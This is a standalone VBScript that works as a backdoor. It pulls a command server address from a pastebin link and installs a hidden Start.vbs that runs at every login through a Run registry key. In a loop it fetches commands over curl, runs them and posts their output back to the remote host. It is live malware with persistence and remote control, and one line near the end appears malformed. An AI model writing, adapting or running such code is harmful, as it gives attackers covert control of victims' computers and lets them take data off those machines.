On Error Resume Next
tmpPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs"
CreateObject("Scripting.FileSystemObject").DeleteFile tmpPath
CreateObject("MSXML2.XMLHTTP").open "GET", "https://pastebin.com/raw/knWXwasC", False
CreateObject("MSXML2.XMLHTTP").send
tunnel = CreateObject("MSXML2.XMLHTTP").responseText
If InStr(tunnel, "hold") > 0 Then
WScript.Quit
End If
tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\Start.vbs"
Set objFile = CreateObject("Scripting.FileSystemObject").CreateTextFile(tempPath, True)
objFile.WriteLine "On Error Resume Next"
objFile.WriteLine "Do While True"
objFile.WriteLine "CreateObject(""MSXML2.XMLHTTP"").open ""GET"", ""https://pastebin.com/raw/knWXwasC"", False"
objFile.WriteLine "CreateObject(""MSXML2.XMLHTTP"").send"
objFile.WriteLine "tunnel = CreateObject(""MSXML2.XMLHTTP"").responseText"
objFile.WriteLine "If InStr(tunnel, ""kill"") > 0 Then"
objFile.WriteLine "CreateObject(""Scripting.FileSystemObject"").DeleteFile(""" & tempPath & """), True"
objFile.WriteLine "CreateObject(""WScript.Shell"").Run ""reg delete """"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"""" /v """"Start"""" /f"", 0, True"
objFile.WriteLine "WScript.Quit"
objFile.WriteLine "End If"
objFile.WriteLine "sh = ""@echo off&cd %userprofile%&cmd /V:ON /C """"SET ip="" & tunnel & ""&&SET sid=""""Authorization: ac3b22bb-4baa2f93-341bd899""""&&SET protocol=http://&&curl !protocol!!ip!/ac3b22bb -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/4baa2f93 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/341bd899 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1"""" > NUL"""
objFile.WriteLine "CreateObject(""WScript.Shell"").Run ""cmd /C "" & sh, 0, True"
objFile.WriteLine "WScript.Sleep 5000"
objFile.WriteLine "Loop"
objFile.WriteLine "On Error Goto 0"
objFile.Close
CreateObject("WScript.Shell").Run "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Start"" /t REG_SZ /d ""%TEMP%\Start.vbs"" /f", 0, True
CreateObject("Scripting.FileSystemObject").GetFile(tempPath).Attributes = CreateObject("Scripting.FileSystemObject").GetFile(tempPath).Attributes Or 3
CreateObject(""WScript.Shell"").Run "%TEMP%\Start.vbs", 0, False
On Error Goto 0
